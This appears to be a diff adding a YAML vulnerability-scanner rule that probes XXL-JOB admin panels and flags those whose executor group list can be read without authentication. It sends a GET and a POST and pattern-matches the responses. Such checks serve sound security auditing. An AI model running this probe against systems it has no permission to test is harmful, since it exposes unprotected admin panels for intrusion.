@@ -1,0 +1,22 @@
+name: poc-yaml-xxl-job-admin-unauth
+rules:
+  - method: GET
+    path: /xxl-job-admin/
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(b"adminlte") && (response.body.bcontains(b"<b>XXL-JOB</b>") || response.body.bcontains(b"<b>XXL</b>JOB") || response.body.bcontains(b"Powered by <b>XXL-JOB</b>"))
+  - method: POST
+    path: /xxl-job-admin/jobgroup/pageList
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: offset=0&pagesize=10
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type.contains("json") && ((r'"code"\s*:\s*200'.bmatches(response.body) && response.body.bcontains(b'"data"') && response.body.bcontains(b'"total"')) || (response.body.bcontains(b'"recordsTotal"') && response.body.bcontains(b'"recordsFiltered"') && response.body.bcontains(b'"data"')))
+detail:
+  author: CO0KlE1
+  description: The XXL-JOB executor group list is accessible without authentication. The check performs only a paginated list query and does not log in or trigger jobs.
+  links:
+    - https://github.com/xuxueli/xxl-job/blob/master/doc/XXL-JOB%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3.md
+    - https://github.com/xuxueli/xxl-job/blob/master/xxl-job-admin/src/main/java/com/xxl/job/admin/business/controller/JobGroupController.java
+
